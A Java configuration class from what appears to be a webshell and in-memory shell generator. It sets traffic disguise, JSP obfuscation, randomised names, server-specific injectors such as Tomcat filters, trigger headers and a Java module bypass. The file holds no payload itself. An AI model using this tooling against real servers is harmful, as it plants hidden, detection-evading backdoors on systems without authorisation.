package org.leo.jmg;


import org.leo.core.entity.Disguise;
import org.leo.core.util.request.ClassNameGenerator;
import org.leo.core.util.request.GenerationRandom;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ThreadLocalRandom;

/**
 * Shell生成器配置类
 * 用于配置Shell生成器的各种参数
 * 
 * @author LeoSpring
 */
public class ShellGeneratorConfig {
    
    // 必需参数
    private Disguise reqDisguise;
    private Disguise respDisguise;
    
    // 可选参数
    private String coreClassName;
    private byte[] coreClassBytes;
    private int respCode = 200;
    // 传输协议。WebShell 支持 http/httpchunk；内存构建支持 http/websocket。
    private String protocol = "http";
    // 区分旧客户端未传 protocol 与调用方显式选择 http，用于兼容旧版 WebSocketInjector 请求。
    private boolean protocolExplicitlyConfigured;
    // 中间件类型（用于注入器，需要用户明确指定宿主机中间件类型）
    private String serverType;
    private String shellType;
    private String packerType;
    private TargetJavaVersion targetJavaVersion = TargetJavaVersion.AUTO;
    private ServletNamespace servletNamespace = ServletNamespace.AUTO;

    // 内存马相关配置
    private String headerName;
    private String headerValue;

    //
    private String shellClassName;
    private byte[] shellClassBytes;

    // 注入器相关配置
    private String injectorClassName;
    private byte[] injectorClassBytes;
    private String urlPattern = "/*";
    private boolean isAbstractTranslet = false;
    /** 部分 Packer（如 ScriptEngine）是否绕过 Java 模块封装 */
    private boolean byPassJavaModule = false;

    /**
     * 用户自定义 JSP/JSPX 混淆步骤 ID 列表（有序）。
     * 为 null 或空时 JSP Packer 使用默认 preset；非空时按此顺序构建 pipeline。
     */
    private List<String> jspObfuscationSteps;

    /** 用于复现一次完整生成过程；默认每个配置生成一个随机 seed。 */
    private long obfuscationSeed = ThreadLocalRandom.current().nextLong();

    /**
     * AI 生成的自定义 JSP 模板（含 {{VAR:}} / {{CLS:}} / {{base64Str}} 占位符）。
     * 非 null 时 JSP Packer 优先使用此模板，替代内置模板文件。
     */
    private String customJspTemplate;

    // LeoCore 私有方法随机名（生成时自动赋值，外部无需关心）
    private String methodAction;
    private String methodTestConn;
    private String methodRedirect;
    private String methodLoadComponent;
    private String methodInvokeComponent;

    // LeoCore 实例/静态字段随机名
    private String fieldParams;
    private String fieldResults;
    private String fieldHostId;
    private String fieldComponents;

    public byte[] getCoreClassBytes() {
        return coreClassBytes;
    }

    public void setCoreClassBytes(byte[] coreClassBytes) {
        this.coreClassBytes = coreClassBytes;
    }

    public void setInjectorClassName(String injectorClassName) {
        this.injectorClassName = injectorClassName;
    }

    public byte[] getInjectorClassBytes() {
        return injectorClassBytes;
    }

    public void setInjectorClassBytes(byte[] injectorClassBytes) {
        this.injectorClassBytes = injectorClassBytes;
    }

    public void setShellClassName(String shellClassName) {
        this.shellClassName = shellClassName;
    }

    public byte[] getShellClassBytes() {
        return shellClassBytes;
    }

    public void setShellClassBytes(byte[] shellClassBytes) {
        this.shellClassBytes = shellClassBytes;
    }

    /**
     * 私有构造函数，使用Builder模式
     */
    private ShellGeneratorConfig() {
        initializeGeneratedNames();
    }

    private void initializeGeneratedNames() {
        java.util.Set<String> used = new java.util.HashSet<String>();
        try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(obfuscationSeed)) {
            this.methodAction          = ClassNameGenerator.randomMethodName(used);
            this.methodTestConn        = ClassNameGenerator.randomMethodName(used);
            this.methodRedirect        = ClassNameGenerator.randomMethodName(used);
            this.methodLoadComponent   = ClassNameGenerator.randomMethodName(used);
            this.methodInvokeComponent = ClassNameGenerator.randomMethodName(used);

            this.fieldParams      = ClassNameGenerator.randomFieldName(used);
            this.fieldResults     = ClassNameGenerator.randomFieldName(used);
            this.fieldHostId      = ClassNameGenerator.randomFieldName(used);
            this.fieldComponents = ClassNameGenerator.randomFieldName(used);
        }
    }
    
    /**
     * 创建配置构建器
     *
     * @param reqDisguise  请求伪装器（必需）
     * @param respDisguise 响应伪装器（必需）
     * @return 配置构建器
     */
    public static Builder builder(Disguise reqDisguise, Disguise respDisguise) {
        return new Builder(reqDisguise, respDisguise);
    }

    public void setByPassJavaModule(boolean byPassJavaModule) {
        this.byPassJavaModule = byPassJavaModule;
    }



    /**
     * 配置构建器
     */
    public static class Builder {
        private ShellGeneratorConfig config;
        
        public Builder(Disguise reqDisguise, Disguise respDisguise) {
            config = new ShellGeneratorConfig();
            config.reqDisguise = reqDisguise;
            config.respDisguise = respDisguise;
        }
        
        /**
         * 设置核心类名
         */
        public Builder coreClassName(String coreClassName) {
            config.coreClassName = coreClassName;
            return this;
        }
        
        /**
         * 设置响应码
         */
        public Builder respCode(int respCode) {
            if (respCode < 100 || respCode > 599) {
                throw new IllegalArgumentException("respCode 必须在 100 到 599 之间，当前值: " + respCode);
            }
            config.respCode = respCode;
            return this;
        }
        
        /**
         * 设置传输协议。
         * 
         * @param protocol 传输协议类型（http、httpchunk/httpChunked、websocket），默认为 http
         * @return Builder实例
         */
        public Builder protocol(String protocol) {
            if (protocol != null && !protocol.trim().isEmpty()) {
                config.protocol = normalizeProtocol(protocol);
                config.protocolExplicitlyConfigured = true;
            }
            return this;
        }

        
        /**
         * 设置触发Header名称（用于内存马）
         */
        public Builder headerName(String headerName) {
            config.headerName = headerName;
            return this;
        }
        
        /**
         * 设置触发Header值（用于内存马）
         */
        public Builder headerValue(String headerValue) {
            config.headerValue = headerValue;
            return this;
        }
        
        /**
         * 设置Header信息（用于内存马）
         */
        public Builder header(String headerName, String headerValue) {
            config.headerName = headerName;
            config.headerValue = headerValue;
            return this;
        }
        
        /**
         * 设置注入器类名
         */
        public Builder injectorClassName(String injectorClassName) {
            config.injectorClassName = injectorClassName;
            return this;
        }
        
        /**
         * 设置Shell类名（用于注入器）
         */
        public Builder shellClassName(String shellClassName) {
            config.shellClassName = shellClassName;
            return this;
        }
        
        /**
         * 设置URL匹配模式（用于注入器）
         */
        public Builder urlPattern(String urlPattern) {
            config.urlPattern = urlPattern;
            return this;
        }
        
        /**
         * 设置是否继承AbstractTranslet（用于注入器）
         */
        public Builder abstractTranslet(boolean isAbstractTranslet) {
            config.isAbstractTranslet = isAbstractTranslet;
            return this;
        }

        /**
         * 目标应用服务器类型，如 Tomcat，须与 {@link ServerInjectorMapper} 注册表中的 key 一致
         */
        public Builder serverType(String serverType) {
            if (serverType == null || serverType.trim().isEmpty()) {
                throw new IllegalArgumentException("serverType 不能为空");
            }
            config.serverType = serverType.trim();
            return this;
        }

        /**
         * 注入器形态名称，如 FilterInjector，须为该 serverType 下支持的注入器名
         */
        public Builder shellType(String shellType) {
            if (shellType == null || shellType.trim().isEmpty()) {
                throw new IllegalArgumentException("shellType 不能为空");
            }
            config.shellType = shellType.trim();
            return this;
        }

        /**
         * 打包器类型，与 {@link org.leo.jmg.mem.packer.PackerRegistry} 中注册的名称一致（忽略大小写）
         */
        public Builder packerType(String packerType) {
            if (packerType == null || packerType.trim().isEmpty()) {
                throw new IllegalArgumentException("packerType 不能为空");
            }
            config.packerType = packerType.trim();
            return this;
        }

        /** 设置生成物预期运行的 Java 版本；默认 AUTO 保持原有行为。 */
        public Builder targetJavaVersion(TargetJavaVersion targetJavaVersion) {
            config.targetJavaVersion = targetJavaVersion == null
                    ? TargetJavaVersion.AUTO
                    : targetJavaVersion;
            return this;
        }

        /** 接受 API 字符串形式：auto、6、7、8、9+、17+。 */
        public Builder targetJavaVersion(String targetJavaVersion) {
            return targetJavaVersion(TargetJavaVersion.parse(targetJavaVersion));
        }

        /** 设置生成物使用的 Servlet API 命名空间。 */
        public Builder servletNamespace(ServletNamespace servletNamespace) {
            config.servletNamespace = servletNamespace == null
                    ? ServletNamespace.AUTO
                    : servletNamespace;
            return this;
        }

        /** 接受 API 字符串形式：auto、javax、jakarta。 */
        public Builder servletNamespace(String servletNamespace) {
            return servletNamespace(ServletNamespace.parse(servletNamespace));
        }

        public Builder byPassJavaModule(boolean byPassJavaModule) {
            config.byPassJavaModule = byPassJavaModule;
            return this;
        }

        public Builder jspObfuscationSteps(List<String> steps) {
            config.jspObfuscationSteps = steps == null
                    ? null
                    : Collections.unmodifiableList(new ArrayList<String>(steps));
            return this;
        }

        /** 设置固定 seed；相同请求和运行环境下可复现随机化结果。 */
        public Builder obfuscationSeed(long seed) {
            config.obfuscationSeed = seed;
            config.initializeGeneratedNames();
            return this;
        }

        public Builder customJspTemplate(String template) {
            config.customJspTemplate = template;
            return this;
        }

        /**
         * 构建配置对象
         */
        public ShellGeneratorConfig build() {
            // 如果核心类名为空，自动生成
            if (config.coreClassName == null || config.coreClassName.trim().isEmpty()) {
                try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(config.obfuscationSeed)) {
                    config.coreClassName = ClassNameGenerator.generateServletStyleClassName();
                }
            }
            return config;
        }
    }
    
    // Getter方法
    
    public Disguise getReqDisguise() {
        return reqDisguise;
    }
    
    public Disguise getRespDisguise() {
        return respDisguise;
    }
    
    public String getCoreClassName() {
        return coreClassName;
    }
    
    public int getRespCode() {
        return respCode;
    }
    

    
    public String getHeaderName() {
        return headerName;
    }
    
    public String getHeaderValue() {
        return headerValue;
    }
    
    public String getInjectorClassName() {
        return injectorClassName;
    }
    
    public String getShellClassName() {
        return shellClassName;
    }
    
    public String getUrlPattern() {
        return urlPattern;
    }
    
    public boolean isAbstractTranslet() {
        return isAbstractTranslet;
    }

    public void setAbstractTranslet(boolean abstractTranslet) {
        isAbstractTranslet = abstractTranslet;
    }

    public String getServerType() {
        return serverType;
    }

    public String getShellType() {
        return shellType;
    }

    public String getPackerType() {
        return packerType;
    }

    public TargetJavaVersion getTargetJavaVersion() {
        return targetJavaVersion;
    }

    public ServletNamespace getServletNamespace() {
        return servletNamespace;
    }

    public ServletNamespace getEffectiveServletNamespace() {
        return servletNamespace.resolve();
    }

    public boolean isByPassJavaModule() {
        return byPassJavaModule;
    }

    public List<String> getJspObfuscationSteps() {
        return jspObfuscationSteps;
    }

    public long getObfuscationSeed() {
        return obfuscationSeed;
    }

    public String getCustomJspTemplate() {
        return customJspTemplate;
    }

    public void setCustomJspTemplate(String customJspTemplate) {
        this.customJspTemplate = customJspTemplate;
    }

    public String getProtocol() {
        return protocol;
    }

    public boolean isWebSocketProtocol() {
        return "websocket".equals(protocol);
    }

    public static String normalizeProtocol(String protocol) {
        if (protocol == null || protocol.trim().isEmpty()) {
            return "http";
        }
        String normalized = protocol.trim().toLowerCase(Locale.ROOT)
                .replace("-", "")
                .replace("_", "");
        if ("http".equals(normalized)) {
            return "http";
        }
        if ("httpchunk".equals(normalized) || "httpchunked".equals(normalized)) {
            return "httpchunk";
        }
        if ("websocket".equals(normalized)) {
            return "websocket";
        }
        throw new IllegalArgumentException(
                "传输协议必须是 http、httpchunk 或 websocket，当前值: " + protocol);
    }

    public static List<String> getSupportedWebShellProtocols() {
        return Collections.unmodifiableList(java.util.Arrays.asList("http", "httpchunk"));
    }

    public static List<String> getSupportedMemoryShellProtocols() {
        return Collections.unmodifiableList(java.util.Arrays.asList("http", "websocket"));
    }

    public String getMethodAction() {
        return methodAction;
    }

    public String getMethodTestConn() {
        return methodTestConn;
    }

    public String getMethodRedirect() {
        return methodRedirect;
    }

    public String getMethodLoadComponent() {
        return methodLoadComponent;
    }

    public String getMethodInvokeComponent() {
        return methodInvokeComponent;
    }

    public String getFieldParams() {
        return fieldParams;
    }

    public String getFieldResults() {
        return fieldResults;
    }

    public String getFieldHostId() {
        return fieldHostId;
    }

    public String getFieldComponents() {
        return fieldComponents;
    }

    /** 返回不阻断生成、但需要调用方展示的目标环境警告。 */
    public List<String> getCompatibilityWarnings() {
        if (getEffectiveServletNamespace() == ServletNamespace.JAKARTA
                && targetJavaVersion.isAuto()) {
            return Collections.singletonList(
                    "Jakarta Servlet 需要 JDK 8+，auto 模式无法确认目标 JDK");
        }
        return Collections.emptyList();
    }

    /**
     * 验证配置是否有效
     *
     * @throws IllegalArgumentException 如果配置无效
     */
    public void validate() {
        if (reqDisguise == null) {
            throw new IllegalArgumentException("reqDisguise不能为空");
        }
        if (respDisguise == null) {
            throw new IllegalArgumentException("respDisguise不能为空");
        }
        if (getEffectiveServletNamespace() == ServletNamespace.JAKARTA
                && !targetJavaVersion.isAuto()
                && targetJavaVersion.getMajor() < 8) {
            throw new IllegalArgumentException("jakarta.servlet 最低要求 JDK 8，当前目标为 JDK "
                    + targetJavaVersion.getValue());
        }
    }

    /**
     * 生成 JSP/JSPX WebShell 前的协议边界校验。
     */
    public void validateForWebShell(String artifactType) {
        validate();
        String normalizedType = artifactType == null
                ? ""
                : artifactType.trim().toUpperCase(Locale.ROOT);
        if (!"JSP".equals(normalizedType) && !"JSPX".equals(normalizedType)) {
            throw new IllegalArgumentException("WebShell 类型必须是 JSP 或 JSPX");
        }
        if (!getSupportedWebShellProtocols().contains(protocol)) {
            throw new IllegalArgumentException(
                    "JSP/JSPX WebShell 仅支持 http 或 httpchunk；websocket 请使用内存构建");
        }
    }

    /**
     * 生成内存马注入器前的校验
     */
    public void validateForInjector() {
        validate();
        if (serverType == null || serverType.trim().isEmpty()) {
            throw new IllegalArgumentException("生成注入器需要指定 serverType（目标应用服务器类型，如 Tomcat）");
        }
        if (shellType == null || shellType.trim().isEmpty()) {
            throw new IllegalArgumentException("生成注入器需要指定 shellType（注入器形态，如 FilterInjector）");
        }
        if (packerType == null || packerType.trim().isEmpty()) {
            throw new IllegalArgumentException("配置类中 packerType 不能为空");
        }
        boolean webSocketInjector = "WebSocketInjector".equals(shellType);
        if ("httpchunk".equals(protocol)) {
            throw new IllegalArgumentException(
                    "httpchunk 协议仅支持 JSP/JSPX WebShell，内存构建仅支持 http 或 websocket");
        }
        if (webSocketInjector && !protocolExplicitlyConfigured && "http".equals(protocol)) {
            // 旧版调用方只通过 shellType 表达 WebSocket；保持生成结果可用并返回准确协议。
            protocol = "websocket";
        }
        if ("websocket".equals(protocol) && !webSocketInjector) {
            throw new IllegalArgumentException(
                    "websocket 协议必须使用 WebSocketInjector 注入器");
        }
        if ("http".equals(protocol) && webSocketInjector) {
            throw new IllegalArgumentException(
                    "WebSocketInjector 仅支持 websocket 协议");
        }
        if ("http".equals(protocol)
                && (headerName == null || headerName.trim().isEmpty()
                || headerValue == null || headerValue.trim().isEmpty())) {
            throw new IllegalArgumentException(
                    "http 内存构建的 headerName 和 headerValue 不能为空");
        }
        if ("websocket".equals(protocol)
                && (urlPattern == null || !urlPattern.startsWith("/") || urlPattern.contains("*"))) {
            throw new IllegalArgumentException(
                    "websocket 的 urlPattern 必须是以 / 开头且不含通配符 * 的端点路径");
        }
    }

}
